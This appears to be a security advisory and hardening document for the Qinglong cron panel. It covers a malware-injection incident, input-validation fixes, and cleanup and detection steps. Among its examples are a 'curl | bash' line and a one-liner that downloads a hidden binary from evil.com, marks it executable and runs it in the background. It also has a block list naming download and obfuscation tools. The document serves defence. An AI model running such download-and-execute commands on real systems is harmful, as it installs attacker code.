# Security Enhancements

## Overview

This document describes the security enhancements implemented to prevent malicious code injection attacks in Qinglong.

## Issue Background

A security vulnerability was discovered where malicious code could be injected into the system through:
1. Cron task fields (`task_before`, `task_after`, `command`)
2. Configuration file writes (`config.sh`, `extra.sh`, etc.)

The reported incident involved a malicious script that:
- Downloaded an external binary (`.fullgc`) from a suspicious domain (`file.551911.xyz`)
- Executed the binary in the background consuming 100% memory
- Persisted by continuously re-injecting itself into configuration files

## Security Fixes Implemented

### 1. Input Validation for Cron Tasks

**File:** `/back/validation/schedule.ts`

Added comprehensive validation to detect and block dangerous shell patterns:

- **Command Substitution**: Blocks `$(...)` and backtick patterns that could execute hidden commands
- **File Downloads**: Blocks `curl`, `wget`, `fetch` commands
- **External URLs**: Blocks HTTP/HTTPS URLs to prevent external resource downloads
- **Hidden Files**: Blocks references to executable files starting with `.` in path contexts
- **Background Execution**: Blocks suspicious `nohup` patterns executing hidden files
- **Combined Threats**: Blocks downloads with output redirection to `/dev/null` (hiding malware)
- **Obfuscation**: Blocks `base64`, `decode`, `eval` patterns
- **Temp Directory Execution**: Blocks execution of files from `/tmp` combined with chmod/execution

### 2. Config File Content Security

**File:** `/back/api/config.ts`

Enhanced validation for configuration file content to prevent:

- Downloads followed by execution (`curl | bash`, `wget | bash`)
- Download and permission changes (`curl && chmod +x`)
- Downloads of hidden files (generalized pattern to catch various malware)
- Background execution of hidden files

### 3. Improved Shell Escaping

**File:** `/back/services/cron.ts`

Replaced weak shell escaping with a robust `escapeShellArg()` function that:

- Properly escapes single quotes using `'\\''` pattern
- Replaces newlines with spaces (not semicolons) to prevent command chain creation
- Prevents command injection through various shell metacharacters

## Security Best Practices

### For Administrators

1. **Review Existing Tasks**: Audit all existing cron tasks for suspicious patterns
2. **Monitor Logs**: Check logs for security validation warnings
3. **Update Dependencies**: Keep all npm/pip dependencies up to date
4. **Limit Access**: Restrict who can create/modify cron tasks and config files
5. **Regular Backups**: Maintain backups of configuration files

### For Users

1. **Trusted Sources Only**: Only add scripts from trusted repositories
2. **Code Review**: Review any script before adding it to your cron tasks
3. **Avoid External URLs**: Don't include download commands in task hooks
4. **Report Suspicious Activity**: Report any unusual system behavior immediately

## Validation Error Messages

When the security system blocks a pattern, you'll see error messages like:

- `命令包含潜在危险的模式，已被安全系统拦截` - Command contains dangerous pattern
- `前置命令包含潜在危险的模式，已被安全系统拦截` - task_before contains dangerous pattern
- `后置命令包含潜在危险的模式，已被安全系统拦截` - task_after contains dangerous pattern
- `配置文件内容包含潜在危险的模式，已被安全系统拦截` - Config file contains dangerous pattern

## What to Do If You're Affected

If you've been affected by the malicious code injection:

### 1. Immediate Actions

```bash
# Stop and remove the malicious process
pkill -f ".fullgc"
rm -f /ql/data/db/.fullgc

# Check for the malicious code in configuration files
grep -r "fullgc" /ql/data/config/
grep -r "551911.xyz" /ql/data/config/
```

### 2. Clean Configuration Files

```bash
# Backup current configs
cp -r /ql/data/config /ql/data/config.backup

# Review and clean these files:
# - /ql/data/config/config.sh
# - /ql/data/config/extra.sh
# - /ql/data/config/task_before.sh
# - /ql/data/config/task_after.sh

# Remove any lines containing:
# - Downloads (curl, wget)
# - External URLs
# - .fullgc references
```

### 3. Review Cron Tasks

1. Log into Qinglong admin panel
2. Check all cron tasks for suspicious content in:
   - Command field
   - task_before field
   - task_after field
3. Delete or clean any suspicious tasks

### 4. Update to Patched Version

Ensure you're running a version of Qinglong with these security fixes.

### 5. Change Credentials

If you suspect compromise:
- Change your Qinglong admin password
- Review and rotate any API tokens
- Check for unauthorized access in logs

## Detection

### Log Analysis

Security events are logged to help detect attempted attacks:

```bash
# Check for security validation failures in logs
grep "安全系统拦截" /ql/data/log/*.log

# Check for suspicious file modifications
grep "配置文件写入" /ql/data/log/*.log
```

### File Integrity

Regularly check for unexpected files:

```bash
# Find hidden executables in data directory
find /ql/data -type f -name ".*" -executable

# Check for recently modified config files
find /ql/data/config -type f -mtime -1
```

## Limitations

These security measures provide defense-in-depth but are not foolproof:

- Legitimate use cases requiring downloads must use alternative methods
- Very sophisticated attacks may find bypasses
- Users with admin access can still compromise the system
- Compromised dependencies can still execute malicious code

## Alternative Approaches for Legitimate Downloads

If you have legitimate use cases that require downloads:

1. **Use Dependencies**: Install packages via npm/pip instead of downloading at runtime
2. **Pre-download Files**: Download files manually and add them to the scripts directory
3. **Use Subscriptions**: Configure subscriptions to pull code from trusted repositories
4. **Request Whitelist**: Contact administrators to whitelist specific trusted domains (future feature)

## Technical Details

### Validation Pattern Examples

**Blocked Pattern:**
```bash
curl https://example.com/script.sh | bash
```
**Reason:** Downloads and executes external code

**Blocked Pattern:**
```bash
d="/ql/data/db";wget -O "$d/.malware" http://evil.com/m;chmod +x "$d/.malware";nohup "$d/.malware" &
```
**Reason:** Multiple violations - download, hidden file, chmod, background execution

**Allowed Pattern:**
```bash
node /ql/scripts/my_script.js
```
**Reason:** No dangerous patterns detected

### Defense in Depth

This implementation uses multiple layers of security:

1. **Input Validation**: Blocks malicious patterns before they reach the system
2. **Shell Escaping**: Prevents injection even if validation is bypassed
3. **Audit Logging**: Records all configuration changes for forensic analysis
4. **Least Privilege**: Existing blacklist prevents access to sensitive files

## Reporting Security Issues

If you discover a security vulnerability, please report it responsibly:

1. Do NOT create public GitHub issues for security vulnerabilities
2. Contact the maintainers privately
3. Provide detailed information about the vulnerability
4. Allow time for a patch before public disclosure

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Shell Command Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

## Version History

- **v1.0** (2026-02-08): Initial security enhancements to prevent code injection attacks
